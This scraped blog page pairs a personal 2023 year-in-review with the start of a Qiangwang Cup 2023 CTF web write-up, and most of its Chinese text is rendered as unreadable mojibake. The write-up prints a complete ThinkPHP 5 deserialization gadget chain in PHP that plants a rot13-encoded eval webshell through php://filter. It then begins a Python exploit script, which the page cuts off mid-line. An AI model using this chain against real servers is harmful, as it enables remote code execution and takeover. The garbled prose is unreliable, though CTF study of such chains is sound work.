<h2 id="é—æ†¾"><a href="#é—æ†¾" class="headerlink" title="é—æ†¾"></a>é—æ†¾</h2><p>å¥½åƒæ˜¯æš‘å‡çš„æ—¶å€™ï¼Œå…¶å®å½“æ—¶æ‰å›½èµ›å›æ¥ï¼Œemmæ„Ÿè§‰æˆ‘å•¥ä¹Ÿä¸ä¼šï¼Œå¾ˆå—ä¼¤ç‹ ç‹ çš„è´¨ç–‘äº†è‡ªå·±ã€‚ç„¶åæœ‰ä¸€å¡«å‚åŠ äº†ä¸€ä¸‹nepnepçš„æ‹›æ–°èµ›ï¼Œå…¶å®å½“æ—¶æˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯æ‹›æ–°èµ›ï¼Œåªæ˜¯åœ¨nssçœ‹è§è¿™ä¸ªæ¯”èµ›äº†ï¼Œæˆ‘å°±å»æ‰“äº†ä¸€ä¸‹ä¸‹ï¼Œæœ‰äº›é¢˜ç›®æ„Ÿè§‰çœŸçš„å¯èƒ½åšå‡ºæ¥ï¼Œå°±å»bilibiliçœ‹äº†ä¸€ä¸‹èµ›åè®²è§£ï¼ˆç»å¯¹ä¸æ˜¯ä¸ºäº†æŠ½å¥–qwqï¼‰ï¼Œç„¶åå‘ç°å¯ä»¥æŠ•ç®€å†NepNepå•Šï¼Œé‚£ä¹ˆå¤§çš„æˆ˜é˜Ÿï¼Œæ„Ÿè§‰ç¦»æˆ‘å¾ˆè¿œå¾ˆè¿œï¼Œä½†æ˜¯æ„Ÿè§‰æŒºå¥½å¥‡çš„ä¹‹å‰æ²¡æœ‰æŠ•è¿‡ç®€å†ï¼Œæˆ‘ç›´æ¥Googleæ‰¾åˆ°ä¸€ä¸ªæ¨¡æ¿ï¼Œæµ…å¡«äº†ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯ï¼Œç„¶åé‡Œé¢å•¥ä¹Ÿæ²¡æœ‰äº†ã€‚vocalï¼ŒhråŠ æˆ‘äº†ï¼Œæˆ‘æœ‰é¢è¯•çš„æœºä¼šï¼Œå¾ˆæ¿€åŠ¨å¾ˆæ¿€åŠ¨ï¼Œä½†æ˜¯æ„Ÿè§‰è‡ªå·±çœŸçš„å­¦çš„å¾ˆå°‘å¾ˆå°‘ï¼Œå°±å±äºæ˜¯æ¼«æ— ç›®çš„çš„å­¦ï¼ŒçŸ¥é“ä¸€äº›ä¸œè¥¿ä½†æ˜¯ä»…é™äºçŸ¥é“ã€‚ç„¶åå°±è·ŸCH3NQUå¤§å“¥è¯´äº†ï¼Œå¤§å“¥æ˜¯çœŸçš„å¾ˆå¥½å¾ˆå¥½ï¼Œç»å¸¸å¸®åŠ©æˆ‘ã€‚ç„¶åæˆ‘ä»¬èŠäº†å¾ˆå¤šï¼Œä¹Ÿé¼“åŠ±æˆ‘å†²ã€‚åæ­£æˆ‘å•¥ä¹Ÿæ²¡æœ‰è¿™ç§æœºä¼šä¹Ÿä¸è¦é’±ï¼Œé‚£å°±å†²å§ï¼Œè¿˜å¸®æˆ‘è”ç³»åˆ°äº†è´å¡”å§ï¼ˆNepNepæˆ˜é˜Ÿçš„ï¼Œvocalæ·±è—ä¸éœ²ï¼Œæˆ‘è¿™æ˜¯åˆè®¤è¯†ä¸€ä¸ªå¤§ä½¬ï¼Œæˆ‘è·‘å»è·Ÿè´å¡”å§ä¹ŸèŠäº†å¾ˆå¤šï¼Œå“ˆå“ˆå“ˆå“ˆè°ä¸å–œæ¬¢é«˜è´¨é‡äººæ‰å‘¢ï¼Œæˆ‘åªèƒ½å†æ¬¡è¯´æˆ‘å¥½å¹¸è¿ï¼Œè´å¡”å§ä¹Ÿå¸®æˆ‘ã€‚</p>
<p>å¼€å§‹é¢è¯•ï¼Œvocalæˆ‘éƒ½ä¸çŸ¥é“æ˜¯å‡ ä¸ªå¤§ä½¬åœ¨è½®ç•ªæ‹·æ‰“æˆ‘äº†ï¼Œè¿™æ—¶å€™æˆ‘æ‰å‘ç°ï¼Œæˆ‘æ˜¯çœŸä¸ä¼šå•Šï¼Œä½†è¿™ä¹Ÿæ˜¯å­¦ä¹ çš„æœºä¼šï¼Œæˆ‘çŸ¥é“äº†è‡ªå·±çš„å¾ˆå¤šä¸è¶³å•¦ï¼Œæˆ‘å¿ƒé‡Œå¾ˆæ¸…æ¥šï¼Œæ²¡æŠ“ä½è¿™æ¬¡æœºä¼šã€‚è¿˜æ˜¯æ€ªè‡ªå·±ä¹‹å‰åŠªåŠ›å¹¶ä¸å¤Ÿã€‚ç„¶åvocalï¼Œkdxcxså“¥ç›´æ¥ä¸€ä¸ªç”µè¯æ‰“è¿‡æ¥ï¼Œè¯´å¸®æˆ‘å¤ç›˜è¿™ä¸ªé¢è¯•ï¼Œç„¶åè¿˜å«ä¸Šäº†è´å¡”å§ã€‚vocalæˆ‘ä½•å¾·ä½•èƒ½å•Šã€‚æ€»ä¹‹ï¼ŒçœŸçš„æ˜¯å¾ˆå¹¸è¿å¾ˆå¹¸è¿äº†ï¼Œä½†æ˜¯è‡ªå·±è¿˜æ˜¯å¾—åŠ æ²¹ï¼Œé—æ†¾å°±é—æ†¾å§ï¼Œä¸èƒ½é‚£ä¹ˆå¤šå¥½äº‹éƒ½è®©æˆ‘å äº†å§</p>
<p><img src="/2024/01/29/my2023total/wps4.png" alt="img"> </p>
<h2 id="å¹¸è¿"><a href="#å¹¸è¿" class="headerlink" title="å¹¸è¿"></a>å¹¸è¿</h2><p>emmå‰é¢éƒ½è¯´äº†é‚£ä¹ˆå¤šå¹¸è¿äº†ï¼Œä½†æ˜¯è¿˜æ˜¯æƒ³ç»§ç»­è¯´ä¸€äº›å…¶å®ƒçš„ï¼Œæ¯”å¦‚é‡åˆ°è¶…çº§è¶…çº§æ¸©æŸ”æ¼‚äº®çš„å¥³æœ‹å‹ï¼ˆå…¶ä»–ä¸å‘Šè¯‰ä½ ï¼‰ã€‚æ¯”å¦‚å°çº¢å¸½ï¼Œè¿™é‡ŒçœŸæ˜¯æˆ‘å¤§å­¦ä»¥æ¥å¼€å§‹åŠªåŠ›çš„åœ°æ–¹ï¼Œæ°å¥½é‡åˆ°äº†å¾ˆå¤šå¿—åŒé“åˆçš„æœ‹å‹ï¼Œå¾ˆå¤šå­¦é•¿å­¦å§éƒ½åœ¨å¸®åŠ©æˆ‘ä»¬ï¼Œå“ˆå“ˆå“ˆæ¯”å¦‚ä¹‹å‰è¯´äº†é‚£ä¹ˆå¤šçš„CH3NQUå¤§å“¥ï¼Œå«è€å¸ˆï¼ˆæ€ä¹ˆè¯´å°±æ˜¯ğŸ‚ï¼Œå°±æ˜¯å¥½ï¼‰ï¼Œè´ºæœ€ï¼ˆæ€ä¹ˆè¯´ï¼Œå°±æ˜¯äº²æ°‘ï¼‰è¿˜æœ‰å¾ˆå¤šå¾ˆå¤šä¸æ˜¯æˆ‘ä»¬éƒ¨é—¨çš„äººå•¦ï¼Œæ¯”å¦‚ç§‹ç§‹å§ï¼Œç‹æœ€ï¼Œè’‹è€å¸ˆä»–ä»¬ï¼ˆè¯´ä¸å®Œæ ¹æœ¬è¯´ä¸å®Œï¼‰ã€‚å½“ç„¶ï¼Œä¹Ÿå°‘ä¸äº†æˆ‘ä»¬ä¸€çº§çš„å¹²äº‹äº†ï¼Œç£Šå­å“¥ï¼Œå¨…å§ï¼Œæ£‹æ€»ï¼Œå¤å“¥ï¼Œå°å­¦åŒå­¦ç­‰ç­‰ç­‰ç­‰ç­‰ç­‰ç­‰ï¼Œè¿˜æœ‰å…¶å®ƒéƒ¨é—¨çš„å¾ˆå¤šå¥½æœ‹å‹ä»¬ã€‚ä¸‹åŠå¹´ä¹Ÿæ˜¯ç»§ç»­ç•™ç€å°çº¢å¸½äº†ï¼Œæˆ‘ä»¬åˆæ‰¾åˆ°äº†æ–°å¹²äº‹ä»¬äº†ï¼Œå±äºéƒ½æ˜¯å¾ˆç‰›çš„ï¼Œå¾ˆå·çš„ï¼Œæ€»ä¹‹å°±æ˜¯å„æœ‰æ‰€é•¿äº†ã€‚å†æ¯”å¦‚å®¤å‹ä»¬ï¼Œå¤§å®¶éƒ½è¶…çº§å’Œç¦ï¼Œç›¸å¤„èµ·æ¥éå¸¸èæ´½ï¼Œå±äºæ˜¯åœ¨é«˜è€ƒå®Œåˆ·æŠ–éŸ³åˆ·åˆ°å¯å®¤é—®é¢˜çš„æ—¶å€™å¿ƒé‡Œæèµ·çš„å¤§çŸ³å¤´ï¼Œç®—æ˜¯è½åœ°äº†ã€‚</p>
<p>ç„¶åå°±æ˜¯C0ba1täº†ï¼Œé˜Ÿå‹ä»¬æ„Ÿè§‰ä¸ä»…å¾ˆå¼ºï¼Œè€Œä¸”éƒ½å¾ˆåŠªåŠ›ï¼Œå±äºæ˜¯æ‰¾åˆ°å¦ä¸€ä¸ªå½’å±äº†</p>
<p>ç„¶åå°±æ˜¯COå•¦ï¼Œè¿™é‡ŒçœŸçš„å¾ˆå¤šå¤§ä½¬äº†ï¼Œæœ‰å¾ˆè´Ÿè´£çš„è€å¸ˆï¼Œè¿˜æœ‰å¾ˆå¤šå¾ˆå¤šå¤§ä½¬å­¦é•¿ï¼Œæœ‰å¾ˆå¤šçš„èµ„æºï¼Œæœ‰éå¸¸å¥½çš„å­¦ä¹ æ°›å›´ã€‚çœŸçš„éå¸¸è£å¹¸èƒ½å¤Ÿè¿›å…¥co</p>
<p>ï¼ˆä¸è¡Œå¤ªå¤šäº†ï¼Œè¯´ä¸å®Œæ ¹æœ¬è¯´ä¸å®Œï¼‰</p>
<p>æ€»ä¹‹å°±æ˜¯å¾ˆå¹¸è¿å•¦ï¼</p>
<p><img src="/2024/01/29/my2023total/wps5.png" alt="img"> </p>
<h2 id="æ¯”èµ›"><a href="#æ¯”èµ›" class="headerlink" title="æ¯”èµ›"></a>æ¯”èµ›</h2><p>ä¸‹åŠå¹´æˆ‘ä»¬è‡ªå·±æ‰“äº†å¾ˆå¤šCTFæ¯”èµ›ï¼Œå¾ˆå¤šæ—¶å€™éƒ½æ˜¯å»åç‰¢äº†d(ÅĞ´Åà¹‘)æ²¡åŠæ³•æˆ‘å¤ªèœäº†(;Â´à¼àº¶Ğ”à¼àº¶&#96;)Â ï¼Œä½†æ˜¯ï¼Œè¿˜æ˜¯å¾ˆå¤šå¾ˆå¤šæ”¶è´§éƒ½ï¼Œæ¯”å¦‚çº¿ä¸‹è§åˆ°æš‘å‡ç½‘å‹è¾‰å“¥ï¼Œè¿˜çœ‹è§å¾ˆå¤šå…¶å®ƒå­¦æ ¡çš„å¤§ä½¬ï¼Œæœ€åè·å¾—äº†äºŒç­‰å¥–ï¼Œå±äºæ˜¯æœ‰ç‚¹ä¸ç”˜å¿ƒä½†æ˜¯æœ‰ä¸€äº›æ„å¤–ï¼Œä½†æ˜¯æ›´å¤šçš„è¿˜æ˜¯æˆ‘å¤ªèœäº†d(ÅĞ´Åà¹‘)ã€‚ç„¶åç„¶åvocalå¤§ä½¬ç›´æ¥å¸¦æˆ‘ä»¬è¿›r3kapigå­æˆ˜é˜Ÿï¼Œåˆå±äºæ˜¯å¹¸ç¦äº†ï¼Œç„¶åé‚£äº›æ¯”èµ›å°±æ˜¯ä»¥å¦ä¸€ç§å¥‡ç‰¹çš„æ–¹å¼åç‰¢äº†d(ÅĞ´Åà¹‘)ï¼Œå¼€å§‹æ¥è§¦æ›´å¤šçš„å›½é™…èµ›ï¼Œå¾ˆå°‘å¾ˆå°‘åšå‡ºé¢˜ã€‚åœ¨notioné‡Œé¢çœ‹è§å¤§ä½¬çš„è§£é¢˜æ€è·¯ï¼ŒçœŸçš„å±äºæ˜¯èµ°è¿›æ–°ä¸–ç•Œçš„å¤§é—¨ï¼ŒçœŸçš„æœ‰å¾ˆåŠªåŠ›çš„å¤ç°äº†ï¼Œä½†æ˜¯æœ‰äº›çœŸçš„çœ‹ç€æ€è·¯ç»™äº†expæˆ‘éƒ½æ‰“ä¸å‡ºæ¥ï¼Œèœçš„æƒ³æ­»ï¼Œç”šè‡³è¿˜èƒ½æŠŠè‡ªå·±ç”µè„‘æ–‡ä»¶ææ‰ï¼ŒæœåŠ¡å™¨ç›´æ¥è¢«æ‹¿ä¸‹ã€‚çœŸæœäº†ã€‚</p>
<p>ä½†æ˜¯åœ¨è¿™é€”ä¸­è¿˜æ˜¯å‚åŠ äº†ä¸€ä¸‹å…¶ä»–çš„æ¯”èµ›ï¼Œå±äºæ˜¯æ··å¥–äº†ï¼Œç‹æœ€å¤§å“¥ç›´æ¥å¸¦é£ã€‚è¿˜æœ‰å…¶å®ƒçš„æˆ‘å°±åªå†™ä¸ªç½‘é¡µï¼Œå°±å…¶ä»–çš„å…¨é åˆ«äººçš„æˆæœäº†ã€‚</p>
<p><img src="/2024/01/29/my2023total/wps6.png" alt="img"> </p>
<h2 id="æŒ–æ´"><a href="#æŒ–æ´" class="headerlink" title="æŒ–æ´"></a>æŒ–æ´</h2><p>åœ¨å¹´æœ«é‚£å‡ å¤©ï¼ŒCH3NQUå“¥æ‹¿ä¸‹å‡ ä¸ªå­¦æ ¡çš„æ¼æ´ï¼Œæˆ‘ä¹‹å‰ä¹Ÿè¯•è¿‡ä½†æ˜¯è‹¦äºæ ¹æœ¬æ‰¾ä¸åˆ°åœ¨å“ªï¼Œç„¶åå°±åœ¨é‚£å‡ å¤©çªç„¶å‘ç°ä¸€ä¸ªæ´ï¼Œç„¶åæ²¡è¿‡å‡ å¤©æµ…è¯•ä¸€ä¸‹å°±åˆæ‰¾åˆ°äº†ã€‚æ„Ÿè§‰å°±æ˜¯æŒ–ç®€å•çš„æ´åªè¦æœ‰ç‚¹ç»éªŒï¼Œç„¶åå¾ˆå®¹æ˜“æ‰¾åˆ°çš„ï¼ˆæˆ‘æƒ³è¦0dayï¼Œæˆ‘æƒ³CVEï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¼‰</p>
<p><img src="/2024/01/29/my2023total/wps7.png" alt="img"> </p>
<p>æ€»ä¹‹å‘¢ï¼Œ2023æœ‰å¾ˆå¤šå¾ˆå¤šå¹¸è¿éƒ½äº‹æƒ…ï¼Œä¹Ÿæœ‰å¾ˆå¤šå¾ˆå¤šçƒ¦æ¼ï¼Œä¹Ÿä¸æ˜¯ä¸€äº›æ–‡å­—èšæè¿°æ¸…æ¥šçš„ï¼Œemmmï¼Œåæ­£è¿˜æ˜¯å¾—ç»§ç»­ç»§ç»­åŠªåŠ›ï¼Œè¶Šæƒ³è‡ªå·±è¶Šèœï¼ŒåŠ æ²¹å§ï¼ï¼ï¼ï¼ï¼å†²å†²å†²ï¼ï¼</p>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/12/27/qiangwangbei/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="Record my study life">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="chleynx's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/27/qiangwangbei/" class="post-title-link" itemprop="url">å¼ºç½‘æ¯2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-12-27 00:26:21" itemprop="dateCreated datePublished" datetime="2023-12-27T00:26:21+08:00">2023-12-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-02-05 00:31:20" itemprop="dateModified" datetime="2024-02-05T00:31:20+08:00">2024-02-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>ç»™äº†dockerï¼Œä»£ç é€»è¾‘</p>
<p><img src="/2023/12/27/qiangwangbei/image-20231218230623159-1707064057755-1.png" alt="image-20231218230623159"></p>
<p>madï¼Œå¼€å±€è¿™é‡Œä¸æ˜¯admin</p>
<p><img src="/2023/12/27/qiangwangbei/image-20231219003304097-1707064057755-2.png" alt="image-20231219003304097"></p>
<p>è¿™ä¸ªå‡½æ•°æœ‰sqlæ³¨å…¥</p>
<p><img src="/2023/12/27/qiangwangbei/image-20231218230743819-1707064057755-3.png" alt="image-20231218230743819"></p>
<p>æ‰¾åˆ°é€»è¾‘</p>
<p><img src="/2023/12/27/qiangwangbei/image-20231218230846206-1707064057755-4.png" alt="image-20231218230846206"></p>
<p>ç»§ç»­</p>
<p><img src="/2023/12/27/qiangwangbei/image-20231218230905900-1707064057755-5.png" alt="image-20231218230905900"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$view-&gt;arrayToMarkdown(unserialize(base64_decode($goods[&#x27;data&#x27;])))</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/27/qiangwangbei/image-20231218231424714-1707064057755-6.png" alt="image-20231218231424714"></p>
<p>æŠ“åŒ…ï¼Œè·å–è¯·æ±‚æ•°æ®</p>
<p>ä»dockerä¸­å¯ä»¥çœ‹åˆ°ï¼Œflagä¸åœ¨æ•°æ®åº“é‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦RCEï¼Œemm</p>
<p>è¿™é‡Œæœ‰ä¸ªååºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Pipes</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Windows extends Pipes</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files = [new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">#Relation</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line">abstract class Relation</span><br><span class="line">&#123;</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;selfRelation = false;</span><br><span class="line">        $this-&gt;query = new Query();#class Query</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;</span><br><span class="line">#OneToOne HasOne</span><br><span class="line">use think\model\Relation;</span><br><span class="line"></span><br><span class="line">abstract class OneToOne extends Relation</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HasOne extends OneToOne</span><br><span class="line">&#123;</span><br><span class="line">    protected $bindAttr = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">        $this-&gt;bindAttr = [&quot;no&quot;, &quot;123&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;</span><br><span class="line">#Output</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line"></span><br><span class="line">class Output</span><br><span class="line">&#123;</span><br><span class="line">    private $handle = null;</span><br><span class="line">    protected $styles = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handle = new Memcached();//ç›®çš„è°ƒç”¨å…¶write()</span><br><span class="line">        $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line">#Model</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line">use think\console\Output;</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line">abstract class Model</span><br><span class="line">&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    protected $error;</span><br><span class="line">    public $parent;#ä¿®æ”¹å¤„</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line">    protected $aaaaa;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;parent = new Output();#Outputå¯¹è±¡,ç›®çš„æ˜¯è°ƒç”¨__call()</span><br><span class="line">        $this-&gt;append = [&#x27;getError&#x27;];</span><br><span class="line">        $this-&gt;error = new HasOne();//Relationå­ç±»,ä¸”æœ‰getBindAttr()</span><br><span class="line">        $this-&gt;selfRelation = false;//isSelfRelation()</span><br><span class="line">        $this-&gt;query = new Query();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db;</span><br><span class="line">#Query</span><br><span class="line">use think\console\Output;</span><br><span class="line"></span><br><span class="line">class Query</span><br><span class="line">&#123;</span><br><span class="line">    protected $model;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;model = new Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;</span><br><span class="line">#Memcached</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line"></span><br><span class="line">class Memcached</span><br><span class="line">&#123;</span><br><span class="line">    protected $handler = null;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handler = new File();//ç›®çš„è°ƒç”¨File-&gt;set()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver;</span><br><span class="line">#File</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    protected $tag;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27; =&gt; 0,</span><br><span class="line">            &#x27;cache_subdir&#x27; =&gt; false,</span><br><span class="line">            &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;path&#x27; =&gt; &#x27;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;tag = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize([new Windows()]));</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç½‘ä¸Šæ‰¾æ¡é“¾å­å°±æ‰“é€šäº†</p>
<p><img src="/2023/12/27/qiangwangbei/image-20231218232718457-1707064057755-7.png" alt="image-20231218232718457"></p>
<p>éœ€è¦æ•°ç»„å½¢å¼çš„</p>
<p>ç„¶åæ„é€ ä¸€ä¸ªsqlè¯­å¥</p>
<p><img src="/2023/12/27/qiangwangbei/image-20231218235801197-1707064057755-8.png" alt="image-20231218235801197"></p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://192.168.153.130:36000/public/index.php/index/admin/do_edit.html&#x27;</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    &#x27;PHPSESSID&#x27;: &#x27;l98e9omcje3gljtum9ith1ffn6&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exp = 